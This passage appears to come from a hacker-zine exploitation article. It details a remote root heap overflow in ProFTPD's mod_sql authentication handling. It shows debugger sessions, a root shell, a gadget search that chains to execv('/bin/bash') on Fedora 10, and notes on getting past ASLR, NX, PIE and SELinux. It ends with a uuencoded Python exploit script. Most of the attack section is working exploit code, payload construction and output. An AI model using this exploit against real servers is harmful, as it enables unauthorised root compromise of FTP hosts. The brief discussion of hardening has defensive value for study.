+%mA%m%f%f%l%m%TA%m%m%f%l%TA%fA%l%Z%fA%T%T%l%f%l%f%f%Z%l%m%Z%f%l%T%f%Z%fAAA%
+Z%l%m%fA%l%m%TA%ZA%f%lAA%f%m%Z%Z%Z%T%Z%f%m%Z%l%fA%Z
+530 Login incorrect.
+*** With luck, you should have a shell ***
+
+id
+uid=0(root) gid=65534(nogroup) groups=65534(nogroup)
+uname -a
+Linux ubuntu 2.6.27-14-generic #1 SMP Tue Aug 18 16:25:45 UTC 2009 i686 
+GNU/Linux
+---
+
+Well, that demonstrates from source code to shellcode execution..
+exploitation via the demonstrated avenue isn't ideal, but still pretty
+decent.
+
+------[ 4.1 - Cleanup structure crash ]
+
+While experimenting with the auth bypass idea with one of the
+3d10e2a054d8124ab4de5b588c592830 crashes, I hit a pool cleanup structure, 
+and decided to experiment further (with a overwrite of 44 bytes), and 
+exploit it without any shellcode required. 
+
+For this section, we'll target Fedora 10, and the following packages:
+
+fbf3dccc1a396cda2d8725b4503bfc16 proftpd-1.3.1-6.fc10.i386.rpm
+938fd1a965d72ef44cd4106c750a0a2d proftpd-mysql-1.3.1-6.fc10.i386.rpm
+
+Firstly, we'll quickly review some of the protection measures 
+enabled/available in Fedora 10. 
+
+- Exec-shield
+  - Aims to prevent code execution via Code Selector limits, or via PAE.
+  - CS limits are not ideal. 
+
+- FORTIFY_SOURCE
+  - Instruments code during compiling and aims to prevent overflows via
+    common library functions. 
+
+- PIE binaries
+  - Some binaries available in Fedora 10 are compiled as a position 
+    independant executable (PIE). 
+  - Numerous binaries are compiled as ET_EXEC's, however, including
+    ProFTPD.
+
+- SELinux
+  - SELinux is a kernel feature that allows mandatory access control in the
+    kernel. For what we're concerned about, it's aimed at restricting what 
+    can happen post exploitation. A frequent criticism of SELinux is that 
+    it does not protect the kernel against attack.
+
+So, looking at the crash:
+
+Program received signal SIGSEGV, Segmentation fault.
+destroy_pool (p=0x8731eac) at pool.c:415
+415         if (p->parent->sub_pools == p)
+(gdb) p *p
+$1 = {first = 0x61413561, last = 0x37614136, cleanups = 0x41386141,
+sub_pools = 0x62413961, sub_next = 0x31624130, sub_prev = 0x0,
+  parent = 0x62413362, free_first_avail = 0x8002927 <Address 0x8002927
+out of bounds>, tag = 0x0}
+
+Quick glance at the source code (from the proftpd-1.3.2-rc2 release, not
+the fedora release):
+
+---
+410 void destroy_pool(pool *p) {
+411   if (p == NULL)
+412     return;
+413
+414   pr_alarms_block();
+415
+416   if (p->parent) {
+417     if (p->parent->sub_pools == p)
+418       p->parent->sub_pools = p->sub_next;
+419
+420     if (p->sub_prev)
+421       p->sub_prev->sub_next = p->sub_next;
+422
+423     if (p->sub_next)
+424       p->sub_next->sub_prev = p->sub_prev;
+425   }
+426   clear_pool(p);
+427   free_blocks(p->first, p->tag);
+428
+429   pr_alarms_unblock();
+430 }
+---
+
+So, we can see that we overwrote p->parent, and thus entered the 
+conditional on line 416. In order to effectively bypass that section, we
+need:
+
+- p->parent to point to accessible memory (doesn't matter where, it's
+  unlikely to point to p)
+
+- p->sub_prev got nulled out earlier, so it doesn't matter.
+
+- p->sub_next to point to writable memory.
+
+- p->cleanups to point to some memory to be the cleanup structure.
+
+The cleanup structure looks like:
+
+---
+655 typedef struct cleanup {
+656   void *data;
+657   void (*plain_cleanup_cb)(void *);
+658   void (*child_cleanup_cb)(void *);
+659   struct cleanup *next;
+660 } cleanup_t;
+---
+
+---
+693 static void run_cleanups(cleanup_t *c) {
+694   while (c) {
+695     (*c->plain_cleanup_cb)(c->data);
+696     c = c->next;
+697   }
+698 }
+---
+
+The benefits of run_cleanups is that we could call a bunch of different
+pointers as needed.
+
+So, all we need now is to meet our requirements earlier.. For 
+reading/writing memory, the BSS is fine.
+
+For the cleanup structure, we need something that is not randomized, and
+that we know the offset for. Luckily for us, ProFTPD formats its response 
+into the resp_buf buffer, which is on the BSS.
+
+(gdb) p resp_buf
+$5 = "Login incorrect.\000 for
+%m%m%TA%ZA%f%l%fA%mAA%f%TA%f%f%l%l%m%lA%f%Z%m%m%TA%Z%ZA%T%Z%ZAAA%m%m%f%m%T%
+m%f%fA%T%T%Z%l%T%m%l%f%f%f%Z%Z%l%TA%l%l%f%mAA%Z%TAA%f%m%ZAA%l%Z%Z%m%Z%lA%f%
+m"...
+
+And, it doesn't clear memory, leaving old data available for us to use as 
+our structure location. Our first fake auth will have a bunch of 
+AAAA / BBBB / CCCC we can use for replacing.
+
+With those in mind, we can trigger the vulnerability, and see what's 
+available to us:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0805c82d in run_cleanups (c=0x80ed933) at pool.c:730
+730         (*c->plain_cleanup_cb)(c->data);
+..
+(gdb) x/10i $eip
+0x805c82d <run_cleanups+16>:    call   *0x4(%ebx)
+(gdb) x/4x $ebx
+0x80ed933 <resp_buf+179>:       0x42424242      0x43434343
+0x44444444      0x45454545
+
+Hm, so we need a location in memory to jump to. We control the first
+argument to the function, which is useful. . Looking at the symbol
+table, we see some stuff of interest:
+
+
+080e44f4 R_386_JUMP_SLOT   __printf_chk
+080e4574 R_386_JUMP_SLOT   mempcpy
+080e4578 R_386_JUMP_SLOT   __memcpy_chk
+080e4604 R_386_JUMP_SLOT   dlsym
+080e46a4 R_386_JUMP_SLOT   execv
+080e469c R_386_JUMP_SLOT   memcpy
+080e48d4 R_386_JUMP_SLOT   mmap64
+080e4800 R_386_JUMP_SLOT   strcat
+
+
+dlsym() might be useful if we can get the results and save it somewhere.
+
+memcpy()/strcat()/memcpy()/etc could be useful for constructing a ret to
+libc style attack.
+
+printf() could be used to leak memory contents. Can't use it for writing
+to memory due to FORTIFY_SOURCE.
+
+mmap64() could be useful to map memory readable, writable and executable 
+(assuming SELinux allows it, which is unlikely in recent releases).
+
+execv() could be used to execute an arbitrary process (assuming not
+prevented by SELinux). execv() takes two parameters, program to execute, 
+and argument list. The argument list must consist of valid pointers to 
+readable memory, or the execve() (syscall) will fail.
+
+Since execv() looks like least effort, we'll need to find a way to modify 
+the stack so that the next argument is a pointer to something suitable (a 
+pointer to NULL would be sufficient)
+
+(gdb) x/4x $esp
+0xbf977c60:     0x42424242      0x080ccbe2      0x080e8a40
+0x08730578
+(gdb) x/s 0x080ccbe2
+0x80ccbe2:       "getgroups"
+
+Taking stock of what we have:
+
+eax            0x42424242       1111638594
+ecx            0x8734e10        141774352
+edx            0x80eb040        135180352
+ebx            0x80ed933        135190835
+esp            0xbf977c60       0xbf977c60
+ebp            0xbf977c78       0xbf977c78
+esi            0x8731eac        141762220
+edi            0x80f680c        135227404
+
+We control eax, edx (edx is the fake pointer for sub_prev/sub_next
+stuff), we control ebx to an extent:
+
+(gdb) x/7x $ebx
+0x80ed933 <resp_buf+179>: 0x42424242 0x43434343 0x44444444 0x45454545
+0x80ed943 <resp_buf+195>: 0x46464646 0x47474747 0x48484848
+
+We control esi to an extent:
+(gdb) x/s $esi
+0x8731eac:       "a5Aa6Aa73\331016\ba9Ab@\260\016\b"
+
+So, with that in mind, we are looking for writes to stack at [esp], 
+[esp+4], [esp+8] and [esp+0xc], and hopefully then a jump register. 
+
+We can assemble a bunch of instructions, and use msfelfscan to show 
+potential hits:
+
+ruby msfelfscan -r
+"\x89[\x44\x54]\x24[\x04\x08\x0c][^\xff\xe8]*\xff[\x53\x10\x50\xd0-\xe0]"
+/usr/sbin/proftpd
+[/usr/sbin/proftpd]
+0x0805b10a 8944240c89d02b4308894424088b431089142489442404ff53
+0x0805b81d 894424048b450c890424ffd2
+0x0805cd62 8944240c8b4310894424088b4208894424048b4204890424ffd7
+0x0805e158 8944240889742404c70424df7b0d08ffd7
+0x08063ed8 8944240c8b431c894424088b4318894424048b4314890424ff53
+0x080706cc 895424048b5508891424ff50
+0x08070720 89442404a13cd80e088b5508891424ff50
+0x08070754 89442404a144d80e088b5508891424ff50
+0x08070787 89442404a140d80e088b5508891424ff50
+0x08070a84 89542404ff50
+0x08070acb 89442404a13cd80e08ff50
+0x08070af3 89442404a144d80e08ff50
+0x08070b5a 89442404a140d80e08ff50
+0x08070cc2 89542404ff50
+0x08070ce3 89442404a13cd80e08ff50
+0x08070d0b 89442404a144d80e08ff50
+0x08070d4a 89442404a140d80e08ff50
+0x08072081 8944240ca184ec0e08890424ffd2
+0x08072127 8944240c8b4604c744240462c20c0889442408a184ec0e08890424ffd2
+0x080721da 8944240ca184ec0e08890424ffd2
+0x0807222b 8944240c8b4604c74424046ac20c0889442408a184ec0e08890424ffd2
+0x080722ac 89442408a184ec0e08890424ffd2
+0x0807824b 894424088954240c8b460489342489442404ff53
+0x080782f2 8954240c894424088b460489342489442404ff53
+0x08078388 8944240c8b450c894424088b460489342489442404ff53
+0x08078468 8944240c8b450c894424088b460489342489442404ff53
+0x08078798 894424088b460489342489442404ff53
+0x08078a4b 89442404ff53
+0x08079b08 8944240889742404891c24ffd2
+0x08079bf2 8944240c8b450c89442408ff53
+0x08079c93 89442404ff53
+0x08079d1c 89442404ff53
+0x0807a16c 8944240c8b450c89442408ff53
+0x0807a264 89442408ff53
+0x0807a7e7 89442408ffd6
+0x0807c7d3 89442404ff53
+0x0807c85c 89442404ff53
+0x0807cc9c 8944240c8b450c89442408ff53
+0x0807e412 89542408894c2404893424ffd3
+0x0807f209 89442404ffd7
+0x0807f222 89442404ffd7
+0x0807f262 89442404ffd7
+
+After spending some time looking at the output, we find one that fits the 
+bill, and is absolutely perfect.
+
+(gdb) x/10i 0x08063ed8
+0x8063ed8 <run_schedule+56>:    mov    %eax,0xc(%esp)
+0x8063edc <run_schedule+60>:    mov    0x1c(%ebx),%eax
+0x8063edf <run_schedule+63>:    mov    %eax,0x8(%esp)
+0x8063ee3 <run_schedule+67>:    mov    0x18(%ebx),%eax
+0x8063ee6 <run_schedule+70>:    mov    %eax,0x4(%esp)
+0x8063eea <run_schedule+74>:    mov    0x14(%ebx),%eax
+0x8063eed <run_schedule+77>:    mov    %eax,(%esp)
+0x8063ef0 <run_schedule+80>:    call   *0xc(%ebx)
+
+If we execute from 0x8063ee3, it does the job perfectly. It will load 
+pointers from $ebx (which we can populate however we want), and stick them 
+on the stack, then jump to an address we want. We will need a program to 
+execute, and a pointer to NULL. We can craft the fakeauth attempt as:
+
+...memory stuff...AAAABBBBCCCC.../bin/sh or /usr/bin/python (as it's
+important to have NULL termination, which will be provided).
+
+Hardware assisted breakpoint 1 at 0x8063ee3: file support.c, line 132.
+
+Breakpoint 1, 0x08063ee3 in run_schedule () at support.c:132
+132           s->f(s->a1,s->a2,s->a3,s->a4);
+Missing separate debuginfos, use: debuginfo-install
+audit-libs-1.7.13-1.fc10.i386 e2fsprogs-libs-1.41.4-6.fc10.i386
+keyutils-libs-1.2-3.fc9.i386 krb5-libs-1.6.3-18.fc10.i386
+libattr-2.4.43-2.fc10.i386 libselinux-2.0.78-1.fc10.i386
+mysql-libs-5.0.84-1.fc10.i386 zlib-1.2.3-18.fc9.i386
+(gdb) x/8i $eip
+0x8063ee3 <run_schedule+67>:    mov    0x18(%ebx),%eax
+0x8063ee6 <run_schedule+70>:    mov    %eax,0x4(%esp)
+0x8063eea <run_schedule+74>:    mov    0x14(%ebx),%eax
+0x8063eed <run_schedule+77>:    mov    %eax,(%esp)
+0x8063ef0 <run_schedule+80>:    call   *0xc(%ebx)
+(gdb) x/x $ebx+0x18
+0x80ed94b <resp_buf+203>:       0x48484848
+(gdb) x/x $ebx+0x14
+0x80ed947 <resp_buf+199>:       0x47474747
+(gdb) x/x $ebx+0xc
+0x80ed93f <resp_buf+191>:       0x45454545
+
+We can replace HHHH with resp_buf + 400 to point to NULL, we can put in our
+offset for the program to execute in GGGG, and our execv code at EEEE, 
+which will be:
+
+080526b8 <execv@plt>:
+ 80526b8:       ff 25 a4 46 0e 08       jmp    *0x80e46a4
+ 80526be:       68 00 05 00 00          push   $0x500
+ 80526c3:       e9 e0 f5 ff ff          jmp    8051ca8 <_init+0x30>
+
+Putting those together, we then see:
+
+Breakpoint 1, 0x08063ee3 in run_schedule () at support.c:132
+132           s->f(s->a1,s->a2,s->a3,s->a4);
+(gdb) c
+Continuing.
+[New process 22952]
+Executing new program: /bin/bash
+warning: Cannot initialize thread debugging library: generic error
+
+Due to alarm() being called in ProFTPD, you'll have to reset it / catch it 
+/ block it (the "trap" command in bash should be able to do this for you), 
+otherwise the connection will drop out some time later on.
+
+If PIE was enabled, and the binary ended up past 0x01000000, we could brute
+force it and still gain code execution. The only problem now to deal with 
+is with SELinux restrictions. Any decent kernel exploit will disable that 
+for you ;)
+
+------[ 4.2 - Potential enhancements ]
+
+There are a variety of enhancements that could be done to make the exploit 
+better in a variety of ways, such as a known target lists, bruteforce 
+ability (both offset and tags, if necessary. Timing attacks may be useful),
+porting it to metasploit so you have the advantage of changing shellcodes,
+etc.
+
+Also, more work would be required against distributions, because if ProFTPD
+is compiled with shared library support, using time() as an offset may 
+change ;) Additionally, it may be possible that some distributions require 
+different ways due to charcter restrictions.
+
+Further research would be needed in common ProFTPD w/ mod_sql.c 
+configuration guides in order to see what table names / fields are used.
+
+Further experimentation with the pool implementation in ProFTPD might be in
+order, as perhaps it would be possible to work out a generic fake/trigger
+string that would work in all cases. 
+
+Since the SQL injection fix, the bug is no longer remote root pre auth via 
+USER handling it has lost a lot of it's sexiness <;-P~ Don't know if the 
+bug is reachable through authentication.. if it is, there's a lot more work
+involved due to dropped privileges, potential chroot()ing, and so on. At 
+least RootRevoke isn't enabled by default according to some random 
+documentation I was reading :p
+
+------[ 4.3 - Last thoughts ]
+
+Initial experimentation of the vulnerability with constraint solvers was
+interesting, however, in hindsight, just replicating the constraint checks
+and random generation would of been a better idea. Same goes for using GA
+to mutate input strings, though the GA use was worse because the metrics
+used was pretty bad. In hindsight, I had a solution looking for a problem.
+
+Additionally, [11] has some more information regarding this vulnerability
+when you consider the timing aspect of heap massages.
+
+--[ 5 - Discussion of hardening techniques against exploitation ]
+
+It's always fun to consider the effects of various hardening techniques
+against exploitation, and if it helps mitigate the issue. Here's some 
+thoughts on the matter.
+
+------[ 5.1 - Address Space Layout Randomisation ]
+
+If the binary is not compiled as a position independent executable (PIE)
+binary, ASLR is not much of a problem as we target the GOT for storing the
+shellcode. We require only one offset, and on non-PIE binaries, we should 
+be in luck.
+
+------[ 5.2 - Non-executable Memory ] 
+
+With kernels using PAE and hardware supported NX-bit will break our 
+shellcode approach, however, it will not affect our approach used in 
+"Cleanup structure crash".
+
+With kernels that use CS limit to approximate non executable memory, it may
+be possible that a higher region of memory is marked executable, and thus 
+our shellcode region is executable. The metasploit stager shellcode reads
+onto the stack and jumps to it, so cs limit approximation would block that
+attempt. A suitable mprotect() call could fix it though.
+
+It may be possible use the overflow to make ProFTPD think we have been 
+authenticated, without requiring any shellcode. Assuming the pool memory 
+layout is not irreparably harmed, we may be able to do some interesting 
+things.
+
+------[ 5.3 - Position Independent Executable Binaries ]
+
+In case of PIE, it would be feasible to brute force the randomisation as
+ProFTPD fork()s for each client connection. In order to make the most of
+ASLR, ProFTPD would have to fork+execve() itself, or be configured to use
+xinetd/inetd (which would probably be a significant performance problem on 
+busy sites). Using fork+execve() would be the best approach as it would 
+require least changes by the user except an update to ProFTPD.
+
+The avenue we are using for exploitation does not lend itself to off-by-X 
+overwrites, as our contents is appended by ')\x00, which restricts the 
+characters we can use dramatically. 
+
+As for information leaks, I have seen heap address info leaks when the 
+server replies with "Password needed for <OUR CONTENT><MANGLED HEAP 
+ADDRESS>". This may be useful at some stage if a different avenue is needed
+for exploitation.
+
+Unfortunately, ProFTPD frequently uses pcalloc() which reduces the 
+potential for info leaks in some other cases.
+
+------[ 5.4 - Stack Protector ] 
+
+SSP does not play much of a part as we are not overwriting the stack, and 
+nor are we abusing a libc function to overwrite contents (due to recent 
+instrumentation added to gcc/glibc/so on). So far, targeting the stack 
+seems irrelevant, and due to ASLR being in modern kernels, not that useful.
+
+------[ 5.5 - RelRO ]
+
+If readonly relocations is enabled on the target binary, (and being 
+enforced/enabled properly) it will break our current avenue of overwriting
+the GOT table to gain control of execution. 
+
+However, it may be possible to target .bss heap pointers in ProFTPD that 
+get called. (objdump -tr /usr/local/sbin/proftpd | grep bss | grep 0004 or 
+so should find potential function pointers :p)
+
+Assuming non-executable memory is not in use, the BSS provides a suitable
+location to store our shellcode, due to the proctitle.c code.
+
+--[ 6 - References
+
+[1]  http://www.proftpd.org
+[2]  http://labix.org/python-constraint
+[3]  http://bitbucket.org/haypo/python-ptrace/
+[4]  http://pyevolve.sourceforge.net/
+[5]  http://www.castaglia.org/proftpd/doc/devel-guide/introduction.html
+[6]  http://www.phreedom.org/solar/exploits/proftpd-ascii/
+[7]  ga_exp_find.py in the attached code.. my bash history says I used
+     it with python ga_exp_find.py -o 32 -i 127.0.0.1 -U -s f .. for 
+     what it's worth :p
+[8]  http://dev.mysql.com/doc/refman/5.0/en/string-syntax.html
+[9]  code/final_exploit/exploit.py
+[10] code/final_exploit/exploitsc.py
+[11] http://felinemenace.org/~andrewg/Timing_attacks_and_heap_exploitation/
+
+
+begin 644 proftpd.py
+M"FEM<&]R="!O<PII;7!O<G0@<WES"FEM<&]R="!R90II;7!O<G0@<VEG;F%L
+M"FEM<&]R="!S=')U8W0*:6UP;W)T('-O8VME=`II;7!O<G0@=&EM90IF<F]M
+M(&]P='!A<G-E(&EM<&]R="!/<'1I;VY087)S97(L($]P=&EO;D=R;W5P"FEM
+M<&]R="!H87-H;&EB"FEM<&]R="!R86YD;VT*:6UP;W)T('1E;&YE=&QI8@II
+M;7!O<G0@<F4@"@II;7!O<G0@<&EC:VQE"FEM<&]R="!S96QE8W0*"FEM<&]R
+M="!C;W!Y"@IS<VQ?879A:6QA8FQE(#T@1F%L<V4*"G1R>3H*"6EM<&]R="!S
+M<VP*"7-S;%]A=F%I;&%B;&4@/2!4<G5E"F5X8V5P="!);7!O<G1%<G)O<BP@
+M93H*"7!A<W,*"@IC;&%S<R!5<V5R4W1R:6YG.@H))R<G"@E5<V5R4W1R:6YG
+M(&ES(&%N(&%B<W1R86-T:6]N('5S960@=&\@<F5F;&5C="!T:&4@9V5N97)A
+M=&5D('-T<FEN9R!F;W(@=&AE(%5315(*"6-O;6UA;F0N"@H))R<G"@H)<F5P
+M971I=&EO;G,@/2`P"0D)"2,@2&]W(&UA;GD@)6TG<S\*"6-H87)S(#T@,"`)
+M"0D)(R!(;W<@;6%N>2!!)W,_"@EP97)C96YT7U1S(#T@,`D)"0DC($AO=R!M
+M86YY("54)W,_"@EP97)C96YT7V9S(#T@,`D)"0DC($AO=R!M86YY("5F)W,_
+M"@EP97)C96YT7VQS(#T@,`D)"0DC($AO=R!M86YY("5L)W,_"@EO=F5R9FQO
+M=U]S:7IE(#T@,`D)"2,@2&]W(&UU8V@@87)E('=E('1R>6EN9R!T;R!O=F5R
+M9FQO=R!B>3\*"6-O;'5M;E]L96X@/2`P"0D)"2,@5VAA="!I<R!T:&4@;&5N
+M9W1H(&]F('1H92!C;VQU;6Y?;F%M93\*"B`@("`@("`@=6YK;F]W;E]T86=?
+M;&5N9W1H(#T@;&5N*"=[54Y+3D]73B!404=])RD*("`@("`@("!I9&5N=%]T
+M86=?;&5N9W1H(#T@;&5N*"=53DM.3U=.)RD*"@H)9&5F(%]?:6YI=%]?*'-E
+M;&8L(&-H<F]M;W-O;64L(&]V97)F;&]W7W-I>F4L(&-O;'5M;E]L96XI.@H)
+M"7-E;&8N8VAR;VUO<V]M92`](&-H<F]M;W-O;64*"@D)<V5L9BYO=F5R9FQO
+M=U]S:7IE(#T@;W9E<F9L;W=?<VEZ90H)"7-E;&8N8V]L=6UN7VQE;B`](&-O
+M;'5M;E]L96X*"@D)<V5L9BYR97!E=&ET:6]N<R`](&-H<F]M;W-O;64N8V]U
+M;G0H(B5M(BD*"0ES96QF+F-H87)S(#T@8VAR;VUO<V]M92YC;W5N="@B02(I
+M"@D)<V5L9BYP97)C96YT7U1S(#T@8VAR;VUO<V]M92YC;W5N="@B)50B*0H)
+M"7-E;&8N<&5R8V5N=%]F<R`](&-H<F]M;W-O;64N8V]U;G0H(B5F(BD*"0ES
+M96QF+G!E<F-E;G1?;',@/2!C:')O;6]S;VUE+F-O=6YT*"(E;"(I"@D)<V5L
+M9BYP97)C96YT7UIS(#T@8VAR;VUO<V]M92YC;W5N="@B)5HB*0H*"0ES96QF
+M+FQE;F=T:"`]('-E;&8N;&5N*"D*"0ES96QF+F-H<F]M;W-O;64N<&]P*"D*
+M"@ED968@;&5N*'-E;&8I.@H)"2<G)PH)"6QE;B@I(&-A;&-U;&%T97,@:&]W
+M(&UU8V@@<W!A8V4@=&AE(&=I=F5N('-T<FEN9R!W:6QL(&5X<&%N9"!T;R!D
+M=64@=&\@=&%G('!A<W-I;F<N"@D))R<G"@H)"2-A<W-E<G0H<V5L9BYC;VQU
+M;6Y?;&5N("$](#`I"@H)"6QI;F5?;&5N9W1H(#T@;&5N*"(B+FIO:6XH<V5L
+M9BYC:')O;6]S;VUE*2D*"0D*"0DC("@@*R!C;VQU;6Y?;&5N("L@/2<*"0ER
+M970@/2`Q("L@<V5L9BYC;VQU;6Y?;&5N("L@,@H)"7)E="`K/2`H<V5L9BYR
+M97!E=&ET:6]N<R`J(&QI;F5?;&5N9W1H*0H)"7)E="`K/2!S96QF+F-H87)S
+M"@D)<F5T("L]('-E;&8N;W9E<F9L;W=?<VEZ90H)"7)E="`K/2`H<V5L9BYU
+M;FMN;W=N7W1A9U]L96YG=&@@*B!S96QF+G!E<F-E;G1?6G,I"2,@>U5.2TY/
+M5TX@5$%'?0H)"7)E="`K/2!S96QF+G!E<F-E;G1?9G,)"0D)"2,@+0H)"7)E
+M="`K/2`H<V5L9BYP97)C96YT7U1S("H@,RD)"0D)(R`P+C`*"0ER970@*ST@
+M*'-E;&8N:61E;G1?=&%G7VQE;F=T:"`J('-E;&8N<&5R8V5N=%]L<RD)"2,@
+M54Y+3D]73@H)"7)E="`K/2`R("`C("<I(`H)"@D)<F5T=7)N(')E=`H*"61E
+M9B!?7W-T<E]?*'-E;&8I.@H)"7)E='5R;B`B(BYJ;VEN*'-E;&8N8VAR;VUO
+M<V]M92D*"F-L87-S(%-I;&QY4W1R=6-T.@H)<&%R86US(#T@6UT*"@ED968@
+M7U]I;FET7U\H<V5L9BP@*F%R9W,I.@H)"6%S<V5R="AL96XH<V5L9BYP87)A
+M;7,I("$](#`I"@H)"6EF*&QE;BAA<F=S*2DZ"@D)"6%S<V5R="AL96XH87)G
+M<RD@/3T@;&5N*'-E;&8N<&%R86US*2D*"@D)"7!A<F%M<R`](&-O<'DN8V]P
+M>2AS96QF+G!A<F%M<RD*"@D)"69O<B!A<F<@:6X@87)G<SH*"0D)"7-E=&%T
+M='(H<V5L9BP@<&%R86US+G!O<"@P*2P@87)G*0H*"61E9B!?7W-T<E]?*'-E
+M;&8I.@H)"7)E="`](%M="@H)"2,@8V%N('!R;V)A8FQY("),(B`J(&%M="P@
+M*G-E;&8N<&%R86US(&ET+@H*"0EF;W(@<&%R86T@:6X@<V5L9BYP87)A;7,Z
+M"@D)"2-P<FEN="!P87)A;0H)"0DC<')I;G0@9V5T871T<BAS96QF+"!P87)A
+M;2D*"0D)<F5T+F%P<&5N9"AS=')U8W0N<&%C:R@B/$PB+"!G971A='1R*'-E
+M;&8L('!A<F%M*2DI"@H)"7)E='5R;B`B(BYJ;VEN*')E="D*"@ED968@7U]L
+M96Y?7RAS96QF*3H*"0ER971U<FX@;&5N*'-E;&8N<&%R86US*2`J(#0*"F-L
+M87-S(%!O;VQ";&]K*%-I;&QY4W1R=6-T*3H*"2,@("`O*B!!8W1U86P@:&5A
+M9&5R("HO"@DC("!S=')U8W0@>PH)(R`@("!C:&%R("IE;F1P.PH)(R`@("!U
+M;FEO;B!B;&]C:U]H9'(@*FYE>'0["@DC("`@(&-H87(@*F9I<G-T7V%V86EL
+M.PH)(R`@?2!H.PH)(R`K('!A9&1I;F<@8W)A<"`Z?`H)(R!T;W1A;"!O9B`R
+M-"!B>71E<RX*"@EE;F1P(`D)/2`P>#0Q-#$T,30Q"@EN97AT(`D)/2`P>#0R
+M-#(T,C0R"@EF:7)S=%]A=F%I;`D](#!X-#,T,S0S-#,*"7!A9%\Q"0D](#!X
+M-#`T,#0P-#`*"@EP87)A;7,@/2!;(")E;F1P(BP@(FYE>'0B+"`B9FER<W1?
+M879A:6PB+"`B<&%D7S$B(%T*"F-L87-S(%!O;VQ(96%D97(H4VEL;'E3=')U
+M8W0I.@H)(R!S=')U8W0@<&]O;"!["@DC("!U;FEO;B!B;&]C:U]H9'(@*F9I
+M<G-T.PH)(R`@=6YI;VX@8FQO8VM?:&1R("IL87-T.PH)(R`@<W1R=6-T(&-L
+M96%N=7`@*F-L96%N=7!S.PH)(R`@<W1R=6-T('!O;VP@*G-U8E]P;V]L<SL*
+M"2,@('-T<G5C="!P;V]L("IS=6)?;F5X=#L*"2,@('-T<G5C="!P;V]L("IS
+M=6)?<')E=CL*"2,@('-T<G5C="!P;V]L("IP87)E;G0["@DC("!C:&%R("IF
+M<F5E7V9I<G-T7V%V86EL.PH)(R`@8V]N<W0@8VAA<B`J=&%G.PH)(R!].PH*
+M"69I<G-T(`D)"3T@,'@S,#,P,S`S,`H);&%S="`)"0D](#!X,S$S,3,Q,S$*
+M"6-L96%N=7!S(`D)/2`P>#,R,S(S,C,R"@ES=6)?<&]O;',)(`D](#!X,S,S
+M,S,S,S,*"7-U8E]N97AT(`D)/2`P>#,T,S0S-#,T"@ES=6)?<')E=@D)/2`P
+M>#,U,S4S-3,U"@EP87)E;G0)"0D](#!X,S8S-C,V,S8*"69R965?9FER<W1?
+M879A:6P)/2`P>#,W,S<S-S,W"@ET86<)"0D](#!X,S@S.#,X,S@*"@DC("<I
+M7'@P,"!F;W(@=&%G(`H)<&%R86US(#T@6R`B9FER<W0B+"`B;&%S="(L(")C
+M;&5A;G5P<R(L(")S=6)?<&]O;',B+"`B<W5B7VYE>'0B+"`B<W5B7W!R978B
+M+"`B<&%R96YT(BP@(F9R965?9FER<W1?879A:6PB("!="@IC;&%S<R!0;V]L
+M0VQE86YU<"A3:6QL>5-T<G5C="DZ"@DC='EP961E9B!S=')U8W0@8VQE86YU
+M<"!["@DC("!V;VED("ID871A.PH)(R`@=F]I9"`H*G!L86EN7V-L96%N=7!?
+M8V(I*'9O:60@*BD["@DC("!V;VED("@J8VAI;&1?8VQE86YU<%]C8BDH=F]I
+M9"`J*3L*"2,@('-T<G5C="!C;&5A;G5P("IN97AT.PH)(WT@8VQE86YU<%]T
+M.PH*"61A=&$@/2`P>#4Q-3$U,34Q"@EP;&%I;E]C;&5A;G5P7V-B(#T@,'@U
+M,C4R-3(U,@H)8VAI;&1?8VQE86YU<%]C8B`](#!X-3,U,S4S-3,)"@EN97AT
+M(#T@,'@U-#4T-30U-`H*"7!A<F%M<R`](%L@(F1A=&$B+"`B<&QA:6Y?8VQE
+M86YU<%]C8B(L(")C:&EL9%]C;&5A;G5P7V-B(BP@(FYE>'0B(%T*"@IC;&%S
+M<R!0<F]&5%!$7T)A<VEC<SH*"2<G)R`*"4)A<V4@8VQA<W,@9F]R(&]F9G-E
+M="!E>'!L;VET871I;VXL(&%N9"!B<G5T969O<F-E(&5X<&QO:71A=&EO;BX*
+M"2<G)PH*"75S97)?8V]L=6UN7VQE;F=T:"`](#`*"@DC(%-E;&8M9&]C=6UE
+M;G1I;F<@8V]D92`Z*0H)=7-E<E]C;VQU;6Y?;&5N9W1H<R`](%L@;&5N*")U
+M<V5R:60B*2P@;&5N*")U<V5R;F%M92(I(%T@"@H);7-F7W!A='1E<FX@/2`H
+M"@D))T%A,$%A,4%A,D%A,T%A-$%A-4%A-D%A-T%A.$%A.4%B,$%B,4%B,D%B
+M,T%B-$%B-2<*"0DG06(V06(W06(X06(Y06,P06,Q06,R06,S06,T06,U06,V
+M06,W06,X06,Y060P060Q)PH)"2=!9#)!9#-!9#1!9#5!9#9!9#=!9#A!9#E!
+M93!!93%!93)!93-!931!935!939!93<G"@D))T%E.$%E.4%F,$%F,4%F,D%F
+M,T%F-$%F-4%F-D%F-T%F.$%F.4%G,$%G,4%G,D%G,R<*"0DG06<T06<U06<V
+M06<W06<X06<Y06@P06@Q06@R06@S06@T06@U06@V06@W06@X06@Y)PH)"2=!
+M:3!!:3%!:3)!:3-!:31!)PH)*0H*"6)A9&-H87)S(#T@<V5T*")<>#`P7'@P
+M85QX,&1<>#%A7'@R,EQX,C5<>#(W7'@U8UQX-69<>&9F(BD*"7-K="`]($YO
+M;F4*"@EC86-H92`]($YO;F4*"@ED968@7U]I;FET7U\H<V5L9BP@:&]S="P@
+M;W!T:6]N<RDZ"@D)<V5L9BYH;W-T(#T@:&]S=`H)"7-E;&8N;W!T:6]N<R`]
+M(&]P=&EO;G,*"@D)(W!R:6YT(&]P=&EO;G,*"@D):68H;W!T:6]N<RYU<V5R
+M7V-O;'5M;E]L96YG=&@I.@H)"0ES96QF+G5S97)?8V]L=6UN7VQE;F=T:',@
+M/2!;(&]P=&EO;G,N=7-E<E]C;VQU;6Y?;&5N9W1H(%T*"0D*"@ED968@<V5T
+M7W5S97)?8V]L=6UN*'-E;&8L(&YA;64I.@H)"7-E;&8N=7-E<E]C;VQU;6Y?
+M;&5N9W1H(#T@;&5N*&YA;64I"@H)9&5F(&UA:V5?=7-E<E]S=')I;F<H<V5L
+M9BP@;W9E<F9L;W=?86UO=6YT+"!C;VQU;6Y?;&5N9W1H+"!P861D:6YG/3`I
+M.@H)"2<G)PH)"6UA:V4@<F5T=7)N<R!A(%5S97)3=')I;F<@8VQA<W,@:6YI
+M=&EA;&EZ960@=VET:"!P87)A;65T97)S(&%B;W9E+@H)"0H)"6]V97)F;&]W
